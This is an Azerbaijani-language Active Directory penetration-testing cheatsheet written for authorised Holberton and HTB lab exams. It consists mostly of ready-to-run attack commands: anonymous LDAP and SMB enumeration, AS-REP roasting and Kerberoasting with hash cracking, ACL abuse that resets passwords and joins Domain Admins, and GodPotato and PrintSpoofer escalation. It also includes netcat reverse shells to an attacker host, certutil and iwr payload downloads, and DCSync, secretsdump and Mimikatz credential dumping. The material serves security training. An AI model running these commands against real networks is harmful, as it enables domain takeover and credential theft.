    # 🔴 Active Directory Pentest — Tam Cheatsheet (Holberton Sprint 2)

> **Qeyd:** Bu sənəd yalnız icazəli lab/imtahan mühitləri üçün hazırlanıb (HTB, Holberton sandbox, öz VirtualBox lab-ın).
> Strategiya: **Guest/low-priv → enumerate → credential leak → shell → privesc → domain dominance**

---

## 📑 Məzmun

0. [Strategiya & Qərar Ağacı](#0-strategiya--qərar-ağacı-exam-flowchart)
1. [Recon — Nmap](#1-recon--nmap)
2. [SMB Enumeration](#2-smb-enumeration)
3. [LDAP Enumeration (dərinliyinə)](#3-ldap-enumeration-dərinliyinə)
4. [RPC Enumeration (rpcclient)](#4-rpc-enumeration-rpcclient)
5. [AD PowerShell Modulu (shell əldə etdikdən sonra)](#5-ad-powershell-modulu-get-ad-shell-əldə-etdikdən-sonra)
6. [PowerView](#6-powerview)
7. [BloodHound](#7-bloodhound)
8. [Credential Harvesting](#8-credential-harvesting)
9. [Password Spraying](#9-password-spraying)
10. [AS-REP Roasting](#10-as-rep-roasting)
11. [Kerberoasting](#11-kerberoasting)
12. [ACL Abuse (GenericAll və s.)](#12-acl-abuse-genericall-genericwrite-writedacl-forcechangepassword)
13. [Initial Access](#13-initial-access)
14. [Privilege Escalation (SeImpersonatePrivilege)](#14-privilege-escalation-seimpersonateprivilege)
15. [Domain Dominance (secretsdump, DCSync, Golden Ticket)](#15-domain-dominance)
16. [Tool Quraşdırma — One Block](#16-tool-quraşdırma--one-block)
17. [Quick Reference Cədvəllər](#17-quick-reference-cədvəllər)
18. [Tam Hücum Zəncirləri (Real Nümunələr)](#18-tam-hücum-zəncirləri-real-nümunələr)
19. [Faydalı Linklər](#19-faydalı-linklər)

---

## 0. Strategiya & Qərar Ağacı (Exam Flowchart)

AD imtahanında ən böyük səhv — alətləri əzbərləmək, amma **məntiqi ardıcıllığı** unutmaqdır. Hər dəfə bu sualları ver:

```
Sənə nə verilib?
│
├── Heç nə (yalnız IP) ──────► Nmap → SMB null session → LDAP anonymous bind
│
├── "Guest" / low-priv user ──► SMB ilə login ol → LDAP-a authenticated bağlan
│                                → description/info sahələrini oxu → AD modulu/PowerView
│
└── Artıq bir credential var ─► Hansı protokolda işləyir? (SMB? LDAP? WinRM?)
                                  → Həmin credential ilə DAHA dərin enumerasiya et
```

**Universal AD Enumeration dövrəsi (hər addımdan sonra təkrarla):**

```
1. Yeni credential/şəxs tapdın?
        ↓
2. SMB-də işləyirmi?  (netexec smb)
        ↓
3. LDAP-da işləyirmi?  (ldapsearch -D)
        ↓
4. WinRM-də işləyirmi?  (netexec winrm / evil-winrm)
        ↓
5. Bu user-in description/info/comment sahəsində nə var?
        ↓
6. Bu user-in SPN-i var? (Kerberoasting)
        ↓
7. Bu user-in ACL-i (GenericAll) hardasa var? (BloodHound/PowerView)
        ↓
8. SYSVOL/NETLOGON-da bu userlə oxuna bilən script varmı?
        ↓
   → Yeni credential/imkan tapana qədər TƏKRARLA
```

> 🧠 **Holberton lab-larının ortaq dizaynı:** Flag-lar demək olar həmişə bir **"hidden/non-standard attribute"**-də olur: `description`, `info`, `comment`, `adminDescription`, `extensionAttribute1-15`, `homeDirectory`, `employeeType`, `homePhone`, `otherTelephone`, `mobile`. Default alətlər (CME/netexec basic mode) bunları göstərmir — sən **explicit olaraq `-Properties *` və ya LDAP-da bütün attributeləri** istəməlisən.

---

## 1. Recon — Nmap

```bash
# Host aktivdirmi?
sudo nmap -sn 10.129.x.x -oA host_alive

# Tam scan — DC-ni identifikasiya etmək üçün ən vacib komanda
sudo nmap -T4 -Pn -n -A 10.129.x.x -oA full_scan

# Yalnız AD-ə aid portlar
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 -sC -sV <IP>
```

**Domain Controller əlamətləri (nmap output-da axtar):**
- Port 88 (Kerberos) + Port 389 (LDAP) + Port 445 (SMB) → 99% DC-dir
- `smb-os-discovery` script çıxışında domain adı görünür
- `ldap-rootdse` script-i naming context-i (`DC=...,DC=...`) verir — **bunu yaz, hər yerdə lazım olacaq**

---

## 2. SMB Enumeration

### 2.1 Banner / Null Session Test

```bash
# Banner — host adı, domain, OS, signing
netexec smb <IP>
crackmapexec smb <IP>

# Null session test (boş user/pass)
netexec smb <IP> -u '' -p ''
smbclient -L //<IP>/ -N

# Guest session test
netexec smb <IP> -u 'guest' -p ''
smbclient -L //<IP>/ -U 'guest%'
```

> 💡 **"Guest" imtahan ssenarisi:** Əgər sənə Guest istifadəçi verilibsə, ilk addım budur — Guest hesabı ilə SMB-yə bağlanmağa çalış. Çoxlu köhnə/zəif konfiqurasiya edilmiş DC-lərdə Guest account aktivdir və SMB enum-a icazə verir. Əgər `STATUS_ACCOUNT_DISABLED` alsan, deməli Guest deaktivdir — bu halda null session (`-u '' -p ''`) sınanmalıdır.

### 2.2 Share Enumeration

```bash
netexec smb <IP> -u '' -p '' --shares
netexec smb <IP> -u 'guest' -p '' --shares
enum4linux-ng -A <IP>
```

### 2.3 Share-ə Qoşulma

```bash
smbclient //<IP>/<ShareName> -N
smbclient //<IP>/<ShareName> -U 'guest'
smbclient //<IP>/<ShareName> -U 'user%password'
```

**smbclient daxilində faydalı komandalar:**

```
ls                  # faylları göstər
cd <folder>          # qovluğa keç
get <file>           # bir fayl yüklə
recurse ON           # recursive listing aktivləşdir
prompt OFF           # hər fayl üçün təsdiq istəmə
mget *               # hamısını yüklə (recurse+prompt off-dan sonra)
```

### 2.4 Spider — Bütün Share-ləri Avtomatik Tarama (ÇOX VACİB)

> ⚠️ Holberton lab-da gördüyümüz dərs: `smbclient` bəzən boş görünən bir share-i (`FlagShare`) yanlış göstərir, halbuki əsl fayl başqa share-də (`IT`) ola bilər. **Həmişə `spider_plus` ilə bütün share-ləri tam tara — adlara güvənmə.**

```bash
netexec smb <IP> -u '' -p '' -M spider_plus
netexec smb <IP> -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```

### 2.5 User Enumeration via SMB

```bash
netexec smb <IP> -u '' -p '' --users
netexec smb <IP> -u '' -p '' --rid-brute
rpcclient -U "" -N <IP>
```

### 2.6 Credential Validation (tapdığın hər credential üçün)

```bash
netexec smb <IP> -u 'username' -p 'password'
netexec smb <IP> -u users.txt -p passwords.txt          # spray
netexec smb <IP> -u 'username' -H '<NTLMhash>'           # pass-the-hash
```

---

## 3. LDAP Enumeration (dərinliyinə)

> 🧬 **Konsepsiya (imtahanda mütləq başa düşülməli):** LDAP — Active Directory üçün "phonebook"dur. AD-də HƏR ŞEY bir **object**-dir: user, group, computer, **və hətta domenin özü** (`DC=domain,DC=local`). Hər object-in onlarla atributu var, amma default sorğular yalnız bir neçəsini (name, sAMAccountName) göstərir. Flag-ları tapmaq üçün **explicit olaraq bütün atributları (`*`) və ya spesifik gizli atributu** istəmək lazımdır.

### 3.1 Base DN Tapmaq

```bash
ldapsearch -H ldap://<IP> -x -s base namingcontexts
```

### 3.2 Anonymous (null) Bind — Credential olmadan

```bash
# Test
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"

# Spesifik OU-da axtarış
ldapsearch -x -H ldap://<IP> -b "OU=LDAP-Project,DC=domain,DC=local" "(objectClass=user)"
```

> Bəzi DC-lər anonymous bind-ə icazə verir (misconfiguration). Bu halda heç bir credential olmadan istifadəçi siyahısını və hətta description sahələrini görmək mümkündür.

### 3.3 Bütün User-ləri Dump Etmək

```bash
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Yalnız username-ləri çıxar (parsing)
ldapsearch -x -H ldap://192.168.56.20 -b "DC=PENTESTLAB,DC=local" "(objectClass=user)" sAMAccountName \
  | grep "^sAMAccountName:" | awk '{print $2}'
```

### 3.4 Description/Comment Sahələrində Credential Axtarışı (ən tez-rast gəlinən vuln)

```bash
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(description=*)" sAMAccountName description

# Hamısını saxla, sonra grep et
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" > ldap_dump.txt
grep -i "sAMAccountName\|description\|userPassword\|pass\|pwd\|cred\|temp" ldap_dump.txt
```

> Real nümunə (Holberton lab-dan): `svc_app → Application Service - Password: AppServ1ce!` , `dreeves → Temp password: Reeves@Temp2024`. Admin-lər rahatlıq üçün şifrəni description sahəsinə yazır — bu, real mühitlərdə də tez-tez rast gəlinən bir səhvdir.

### 3.5 BÜTÜN Atributları Force Etmək (`*`) — Gizli Flag-ları Tapmaq Üçün #1 Üsul

```bash
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)" "*"
```

Niyə işləyir: `netexec`/`crackmapexec` kimi alətlər yalnız "common" atributları göstərir. `"*"` LDAP-a deyir: "bu obyektin BÜTÜN atributlarını ver" — `extensionAttribute1-15`, `adminDescription`, `homeDirectory`, `employeeType`, `homePhone`, `otherTelephone`, `info`, `mobile` kimi sahələr buraya daxildir.

### 3.6 Domen Obyektinin Özünü Sorğulamaq (flag çox vaxt elə burada olur!)

```bash
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" "(objectClass=domain)" adminDescription
```

> 🧠 Mental model: AD = users + groups + computers + **domen obyektinin özü**. Domen obyekti də DN-ə malikdir (`DC=domain,DC=local`) və öz atributlarına malikdir. `(objectClass=domain)` filtri yalnız domen object-ni qaytarır.

### 3.7 Konkret User üçün Bütün Atributlar

```bash
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" "(sAMAccountName=targetuser)" "*"
```

### 3.8 Advanced LDAP Filters — userAccountControl Bit Flags

`userAccountControl` atributu bir bitmask-dır. Spesifik konfiqurasiyalı hesabları tapmaq üçün **matching rule OID `1.2.840.113556.1.4.803`** (bitwise AND) istifadə olunur:

| Bayraq | Hex | Decimal | Mənası |
|---|---|---|---|
| `ACCOUNTDISABLE` | 0x2 | 2 | Hesab deaktiv |
| `DONT_EXPIRE_PASSWORD` | 0x10000 | 65536 | Şifrə vaxtı bitmir |
| `DONT_REQ_PREAUTH` | 0x400000 | 4194304 | **Kerberos pre-auth deaktiv → AS-REP Roastable** |

```bash
# AS-REP Roastable hesabları LDAP filtri ilə tapmaq
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Deaktiv hesabları tapmaq
ldapsearch -x -H ldap://<IP> -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName
```

### 3.9 CrackMapExec/NetExec ilə LDAP

```bash
netexec ldap <IP> -u '' -p '' --users
netexec ldap <IP> -u 'username' -p 'password' --users
netexec ldap <IP> -u 'username' -p 'password' --groups
```

### 3.10 windapsearch (daha təmiz output)

```bash
windapsearch --dc <IP> -d domain.local -U            # bütün userlər
windapsearch --dc <IP> -d domain.local --da          # domain admins
windapsearch --dc <IP> -d domain.local -U --full     # full attributes
```

---

## 4. RPC Enumeration (rpcclient)

> 🧠 **Niyə RPC?** LDAP = "database view", RPC (MS-RPC, SMB üzərindən) = Windows-un daxili admin interfeysi. Bəzi atributlar (xüsusilə legacy/`comment`/`unknown_*`/`user_parameters` sahələri) LDAP-da görünməyə bilər, amma RPC vasitəsilə görünür.

```bash
rpcclient -U "" -N <IP>          # null session
rpcclient -U 'user%pass' <IP>    # authenticated

# rpcclient daxilində:
enumdomusers           # bütün userləri RID-lə göstər
enumdomgroups           # bütün qrupları göstər
queryuser <RID>         # konkret user üçün TAM məlumat (RID hex formatda: 0x468)
querygroup <RID>        # qrup məlumatı
queryusergroups <RID>   # user-in üzv olduğu qruplar
```

**Axın:** `enumdomusers` → RID-ləri al → hər maraqlı user üçün `queryuser <RID>` ilə tam obyekti oxu (xüsusilə `comment`, `description`, `unknown_*` sahələrinə diqqət et).

---

## 5. AD PowerShell Modulu (Get-AD*) — Shell Əldə Etdikdən Sonra

Əgər WinRM/RDP ilə domain-joined maşına shell əldə etmisənsə (hətta low-priv user ilə), bu, LDAP-dan **daha rahat və güclü** üsuldur:

```powershell
Get-Module -ListAvailable ActiveDirectory
Import-Module ActiveDirectory

# Domen məlumatı
Get-ADDomain
$dn = (Get-ADDomain).DistinguishedName

# Domen obyektinin BÜTÜN atributları (flag çox vaxt burada!)
Get-ADObject -Identity $dn -Properties * | Format-List *

# Service account-ları tap (svc_ prefiksli)
Get-ADUser -Filter 'SamAccountName -like "svc*"' -Properties *

# Qrup atributları (məs. Domain Admins)
Get-ADGroup "Domain Admins" -Properties * | Format-List *

# BÜTÜN userlərin gizli sahələri (description, info, homeDirectory, mobile)
Get-ADUser -Filter * -Properties HomeDirectory,Description,Info,Mobile,MobilePhone |
  Format-List SamAccountName,HomeDirectory,Description,Info,Mobile,MobilePhone

# Windows Registry-də custom key axtarışı (bəzi flag-lar burada olur)
cd HKLM:\SOFTWARE
ls
```

### Avtomatik "flag axtaran" PowerShell skripti

Bütün userlərin BÜTÜN atributlarını çəkib, "flag" görünüşlü dəyərləri özü tapan skript:

```powershell
$users = Get-ADUser -Filter * -Properties *
$users | ForEach-Object {
    $props = $_.PSObject.Properties
    foreach ($prop in $props) {
        if ($prop.Name -notin @("DistinguishedName","Enabled","GivenName","Surname",
            "SamAccountName","Name","ObjectClass","ObjectGUID","SID","UserPrincipalName")) {
            if ($prop.Value -match "flag|FLAG|\{.*\}|BH|bloodhound") {
                Write-Host "`nFound in $($_.SamAccountName): $($prop.Name) = $($prop.Value)" -ForegroundColor Green
            }
        }
    }
}
```

---

## 6. PowerView

PowerView — AD enumerasiyası üçün PowerShell modulu (BloodHound-un GUI-siz versiyası kimi düşün).

```powershell
# Import (faylı yüklədikdən sonra)
Import-Module .\PowerView.ps1

# Domen reconnaissance
Get-Domain
Get-DomainController
Get-DomainPolicyData

# Domen obyektinin özünün bütün atributları
Get-DomainObject -Identity "DC=domain,DC=local" -Properties *

# User enumeration — default vs full properties
Get-DomainUser -Identity pv_scout | Select Name,Description
Get-DomainUser -Identity pv_scout -Properties * | Format-List *

# Qruplar və üzvləri
Get-DomainGroup | Select samaccountname
Get-DomainGroupMember -Identity "<GroupName>"

# ACL / GenericAll axtarışı (ÇOX VACİB modul)
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity <user/group> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# SPN olan hesabları tap (Kerberoasting hədəfləri)
Get-DomainUser -SPN
Get-DomainSPNTicket -SPN "service/account" | fl
# birbaşa hashcat formatında çıxart:
Get-DomainSPNTicket -SPN "service/account" -OutputFormat Hashcat | fl
```

> 💡 **PowerShell + UNC path qeydi:** `Get-Content`-in `-Credential` parametri YOXDUR. Network share-i fərqli credential-la oxumaq üçün əvvəlcə map et:
> ```powershell
> $cred = Get-Credential   # və ya New-Object System.Management.Automation.PSCredential
> New-PSDrive -Name X -PSProvider FileSystem -Root "\\dc01\Share" -Credential $cred
> Get-Content X:\file.txt
> # və ya net use ilə
> net use X: \\dc01\Share /user:domain\user password
> ```

---

## 7. BloodHound

> 🧠 BloodHound = LDAP + RPC + SMB-dən topladığı bütün məlumatı bir **graph database**-ə yığır və attack path-ləri vizual göstərir. ldapsearch "bir atribut" göstərirsə, BloodHound "bütün relationship-ləri" göstərir.

### 7.1 Data Toplama

```bash
# Python collector (ən geniş istifadə olunan)
bloodhound-python -u 'username' -p 'password' -d domain.local -ns <DC_IP> -c All

# Nəticə: bir neçə .json fayl (users, groups, computers, domains, gpos)
```

### 7.2 BloodHound GUI-yə Import

1. Neo4j-i başlat, BloodHound GUI-ni aç
2. "Upload Data" → toplanan JSON/ZIP faylları yüklə
3. Node-a klikləyib **"Node Info"** panelindən bütün property-lərə bax (LDAP-dan görünməyən sahələr burada görünür)

### 7.3 Faydalı Sorğular (Cypher / built-in queries)

- `Find Shortest Paths to Domain Admins` — sənin user-dən Domain Admin-ə qədər yol
- `Find Principals with DCSync Rights` — kim DCSync edə bilər
- Node üzərində → **Outbound Object Control** → kimə GenericAll/GenericWrite-ın var

### 7.4 bloodyAD (LDAP üzərindən ACL abuse aləti)

BloodHound-da tapdığın ACL-ləri (GenericAll, ForceChangePassword) faktiki olaraq **istifadə etmək** üçün:

```bash
pip install bloodyAD

# Şifrə dəyişmək (ForceChangePassword / GenericAll varsa)
bloodyAD --host <DC_IP> -d domain.local -u 'attacker_user' -p 'attacker_pass' \
  set password 'target_user' 'NewPassword123!'

# Qrupa üzv əlavə etmək (GenericWrite/Self-membership varsa)
bloodyAD --host <DC_IP> -d domain.local -u 'attacker_user' -p 'attacker_pass' \
  add groupMember 'Domain Admins' 'attacker_user'
```

---

## 8. Credential Harvesting

### 8.1 Description/Info Sahələri (yuxarıda §3.4-də izah edildi)

### 8.2 GPP / Groups.xml / cpassword (Group Policy Preferences)

Köhnə GPO-larda yaradılmış local hesablar üçün şifrə **AES ilə şifrələnir**, amma Microsoft AES açarını 2014-də (MS14-025) ictimailəşdirib — yəni `cpassword` dəyəri ictimai açarla **dərhal decrypt oluna bilər**.

```bash
# SYSVOL-u tara, Groups.xml axtar
find . -name Groups.xml
cat Groups.xml          # cpassword="..." sahəsinə bax

# Decrypt et
gpp-decrypt "<cpassword_dəyəri>"
```

**Niyə işləyir:** `Groups.xml` SYSVOL-da saxlanır → SYSVOL bütün authenticated (bəzən anonymous) userlər üçün oxunabiləndir → admin GPP ilə local admin şifrəsi təyin edib → AES açarı public olduğu üçün `cpassword` → plaintext.

### 8.3 SYSVOL/NETLOGON Logon Script-lərində Hardcoded Credential

```bash
smbclient //<IP>/SYSVOL -U 'user%pass'
# domain.local/Policies/{GUID}/Scripts/ qovluğuna keç, .bat/.ps1/.vbs faylları oxu
cat *.bat
```

> Holberton lab-dan real nümunə: SYSVOL → `scripts` qovluğu → `bh_notes.txt` faylında flag/credential. **Hər zaman SYSVOL-u tam tara, sadəcə default qovluqlara baxma.**

### 8.4 LAPS (əgər mövcuddursa)

```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
```
(Yalnız bu atributu oxumaq icazəsi olan hesablar üçün işləyir — adətən admin qrupları.)

---

## 9. Password Spraying

```bash
# Tapılan user siyahısına qarşı bir password sına (lockout-dan ehtiyatlı ol!)
netexec smb <IP> -u users.txt -p 'CompanyPassword2024!' --continue-on-success

# Kerberos üzərindən spray (lockout-u daha az tetikləyir, AD audit-də fərqli görünür)
kerbrute passwordspray -d domain.local --dc <IP> users.txt 'Password123!'
```

> ⚠️ Lockout policy-ni əvvəlcədən yoxla (`Get-DomainPolicyData` / `crackmapexec smb <IP> --pass-pol`) — yoxsa hesabları kilidləyib öz-özünə DoS yaradarsan.

---

## 10. AS-REP Roasting

**Boşluq nədir:** Kerberos default olaraq pre-authentication tələb edir (istifadəçi əvvəlcə şifrəni "sübut" etməlidir ki, TGT alsın). Lakin `DONT_REQ_PREAUTH` bayrağı aktiv olan hesablar üçün **HEÇ BİR credential bilmədən** AS-REP cavabını istəmək mümkündür — bu cavab istifadəçinin şifrə hash-i ilə şifrələnib, demək olar offline crack edilə bilər.

### Addım-addım

```bash
# 1. Userlist lazımdır (LDAP/SMB enum-dan al, ya da bilinən adlarla yarat)
# usersfile = users.txt (hər sətrdə bir username)

# 2. Pre-auth deaktiv olan hesabları tap və hash al (credential lazım deyil!)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.hash

# Konkret target məlum olduqda:
impacket-GetNPUsers domain.local/legacy -dc-ip <DC_IP> -no-pass

# Əgər artıq credential-ın var, BÜTÜN AS-REP roastable hesabları avtomatik tap:
impacket-GetNPUsers domain.local/user:pass -dc-ip <DC_IP> -request -outputfile asrep.hash

# 3. Hash-i crack et
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash
john --show asrep.hash
```

**Hash formatı:**
```
$krb5asrep$23$dev_jenkins@CORP2.LOCAL:...
```

### Cracked credential ilə davam et — gizli atributu oxu

```bash
ldapsearch -x -H ldap://<DC_IP> -D "legacy@domain.local" -w 'CrackedPassword123' \
  -b "DC=domain,DC=local" "(sAMAccountName=legacy)" comment
```

> 🧠 **Tam zəncir (yadda saxla, exam üçün):**
> ```
> LDAP/SMB enum → "no kerberos preauth" görmüsən
>      ↓
> GetNPUsers → AS-REP hash al
>      ↓
> hashcat -m 18200 → plaintext şifrə
>      ↓
> Bu credential ilə login ol → davam et (LDAP/SMB/WinRM)
> ```

---

## 11. Kerberoasting

**Boşluq nədir:** Service Principal Name (SPN) qeydiyyatdan keçmiş HƏR HANSI hesab üçün **istənilən authenticated domain user** TGS bileti istəyə bilər (bu, Kerberos-un dizaynının bir hissəsidir, söndürülə bilməz). Bu bilet həmin xidmət hesabının NTLM hash-i ilə şifrələnib → offline crack mümkündür, **heç bir failed-login/lockout tetiklənmir**.

### Addım-addım

```bash
# 1. SPN-li hesabları tap (authenticated istənilən domain user kifayətdir)
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP>

# 2. TGS bilet(lər)ini al və saxla
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request -outputfile kerb.hash

# Nümunə:
impacket-GetUserSPNs corp.local/webadmin:'W3b@dmin2024' -dc-ip 10.20.1.10 -request -outputfile kerb.hash

# 3. Crack et
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerb.hash
john --show kerb.hash
```

**Hash formatı:**
```
$krb5tgs$23$*svc_backup$CORP.LOCAL$...
```

### PowerView ilə alternativ

```powershell
Get-DomainUser -SPN
Get-DomainSPNTicket -SPN "MSSQLSvc/sqlsrv01" -OutputFormat Hashcat | fl
```

> 🧠 **Niyə service account-lar zəifdir:** Çox vaxt illər əvvəl təyin edilib, dəyişdirilmir, mürəkkəb tələbə tabe deyil. Kerberoasting-in effektivliyi **wordlist keyfiyyətindən** asılıdır — rockyou + best64 qaydası adətən kifayətdir.

---

## 12. ACL Abuse (GenericAll, GenericWrite, WriteDACL, ForceChangePassword)

**Boşluq nədir:** Active Directory-də hər obyektin bir Access Control List-i (ACL) var. Əgər `A` istifadəçisinin `B` obyekti üzərində **GenericAll** (full control) hüququ varsa, `A` → `B`-nin şifrəsini sıfırlaya, atributlarını dəyişə, qrupa əlavə edə bilər — **`B`-nin razılığı olmadan**.

### Tapmaq

```powershell
# PowerView
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "<target>" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

və ya BloodHound-da node üzərində **"Outbound Object Control"**.

### İstismar Etmək

**Şifrə sıfırlama (GenericAll / ForceChangePassword):**

```powershell
# PowerShell native (RSAT modulu ilə)
$pass = ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force
Set-ADAccountPassword -Identity "target_user" -NewPassword $pass -Reset

# PowerView
Set-DomainUserPassword -Identity target_user -AccountPassword $pass
```

**Linux-dan (bloodyAD ya da impacket ilə):**

```bash
bloodyAD --host <DC_IP> -d domain.local -u attacker -p 'pass' set password target_user 'NewPass123!'

# rpcclient alternativi (eyni effekt, başqa protokol)
rpcclient -U 'attacker%pass' <DC_IP> -c "setuserinfo2 target_user 23 'NewPass123!'"
```

**Qrupa özünü əlavə etmək (GenericWrite/Self-membership varsa):**

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user"
```

```bash
bloodyAD --host <DC_IP> -d domain.local -u attacker -p 'pass' add groupMember 'Domain Admins' attacker
```

---

## 13. Initial Access

### 13.1 evil-winrm (WinRM — Port 5985/5986)

```bash
# Açıqdırmı?
nmap -p 5985,5986 <IP>
netexec winrm <IP> -u 'username' -p 'password'

# Şifrə ilə qoşulma
evil-winrm -i <IP> -u 'username' -p 'password'

# Hash ilə (Pass-the-Hash)
evil-winrm -i <IP> -u 'username' -H '<NTLMhash>'
```

**evil-winrm daxilində faydalı komandalar:**

```
upload /local/path/file.exe          # fayl yüklə target-ə
download C:\path\file.txt            # fayl endir target-dən
menu                                 # extra funksiyalar
Invoke-Binary ./tool.exe             # binary-i memory-də işlət (disk-ə yazmadan)
```

### 13.2 Impacket Alternativləri

```bash
impacket-psexec  domain/user:pass@<IP>     # SYSTEM shell, gurultulu (service yaradır)
impacket-wmiexec domain/user:pass@<IP>     # user-level shell, sakit
impacket-smbexec domain/user:pass@<IP>     # SMB-based shell
```

### 13.3 RDP

```bash
xfreerdp /u:username /p:password /v:<IP>
# və ya
rdesktop -u username -p password <IP>
```

### 13.4 Pass-the-Hash / Pass-the-Ticket

```bash
# SMB-də hash ilə
netexec smb <IP> -u Administrator -H '<NTLMhash>'
smbclient //<IP>/C$ -U "Administrator" --pw-nt-hash '<NTLMhash>'

# Pass-the-Ticket (Kerberos bilet ilə, .ccache faylı)
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/Administrator@<hostname>
```

### 13.5 İlk Komandalar Shell Aldıqdan Sonra

```powershell
whoami
whoami /priv          # ← SeImpersonatePrivilege axtar
whoami /all
net user <username>
ipconfig /all
```

---

## 14. Privilege Escalation (SeImpersonatePrivilege)

**Boşluq nədir:** `SeImpersonatePrivilege` (adətən service account-larda default aktivdir) sahibinə bir client token-i təqlid etmə hüququ verir. "Potato" ailəsi alətlər (RPC/COM/Print Spooler trick-ləri ilə) bu hüququ **SYSTEM-ə token təqlidinə** çevirir.

### Addım 1: Privilegi Təsdiqlə

```powershell
whoami /priv
```

Bax (status `Enabled` olmalıdır):
```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

və ya `SeAssignPrimaryTokenPrivilege`.

### Addım 2: winPEAS ilə Daha Geniş Enum (əgər vaxt varsa)

```bash
# Kali-də host et
cd /path/to/tools/ && python3 -m http.server 8080
```
```powershell
# Target-də endir
iwr http://<KALI_IP>:8080/winPEASx64.exe -OutFile winPEASx64.exe
.\winPEASx64.exe
```

Baxılacaq bölmələr: `Token Privileges` (SeImpersonatePrivilege), `Services Information` (unquoted paths), `Scheduled Tasks`, `Credentials in files`.

### Addım 3: Exploit-i Yüklə

```bash
# Kali-də
python3 -m http.server 8080
```
```powershell
# Target-də (evil-winrm-də)
upload /path/to/GodPotato-NET4.exe

# və ya PowerShell ilə
iwr http://<KALI_IP>:8080/GodPotato-NET4.exe -OutFile GodPotato.exe
certutil -urlcache -f http://<KALI_IP>:8080/GodPotato-NET4.exe GodPotato.exe
```

### Addım 4a: GodPotato (bütün modern Windows OS-lərdə işləyir — TƖVSİYƏ OLUNUR)

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# Admin user əlavə et
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker Password123! /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"

# Reverse shell
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe <KALI_IP> 4444 -e cmd"
```

### Addım 4b: PrintSpoofer (Windows 10 / Server 2019)

```powershell
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c powershell
.\PrintSpoofer64.exe -c "cmd /c whoami"

# Reverse shell
.\PrintSpoofer64.exe -c "cmd /c nc.exe <KALI_IP> 4444 -e cmd"
```

### Addım 5: Reverse Shell-i Tut

```bash
nc -lvnp 4444
```

### Addım 6: SYSTEM Təsdiqlə

```powershell
whoami
# nt authority\system  ✅
```

---

## 15. Domain Dominance

### 15.1 secretsdump (uzaqdan, credential olduqda)

```bash
impacket-secretsdump domain/Administrator:password@<IP>
impacket-secretsdump domain/Administrator@<IP> -hashes :<NTLMhash>
```

Çıxış: **SAM**, **LSA secrets**, və əgər DC-yə qarşı işlədilibsə **NTDS.dit** (bütün domen hash-ləri).

### 15.2 DCSync (`-just-dc`)

**Boşluq nədir:** DCSync — DC-yə kod icra etmədən, **legitimate replication protokolundan istifadə edərək** parol hash-lərini birbaşa istəməkdir. Bunun üçün hədəf hesabın `Replicating Directory Changes` + `Replicating Directory Changes All` (adətən Domain Admins/DC-lərdə olan) hüquqları olmalıdır.

```bash
# Bütün domen hash-lərini çıxar (Administrator + krbtgt daxil)
impacket-secretsdump domain/svc_backup:'Password1'@<DC_IP> -just-dc

# Yalnız NTLM hash-ləri (daha tez)
impacket-secretsdump domain/svc_backup:'Password1'@<DC_IP> -just-dc-ntlm

# crackmapexec/netexec alternativi
netexec smb <DC_IP> -u svc_backup -p 'Password1' --ntds
```

> 🧠 **Necə tapırsan ki, kim DCSync edə bilər:** Adətən bir service account-un `description` sahəsində "backup", "replication" kimi açar sözlər olur (Holberton lab-da: `svc_backup` description-da replikasiya hüquqlarına işarə edirdi). BloodHound-da bunu **"Has DCSync Rights"** kimi qrafda da görmək olar.

### 15.3 Pass-the-Hash ilə Administrator Girişi

```bash
evil-winrm -i <IP> -u Administrator -H '<NTLMhash>'
smbclient //<IP>/C$ -U "Administrator" --pw-nt-hash '<NTLMhash>'
netexec smb <IP> -u Administrator -H '<NTLMhash>'
```

### 15.4 Mimikatz (target üzərində, SYSTEM olduqdan sonra)

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
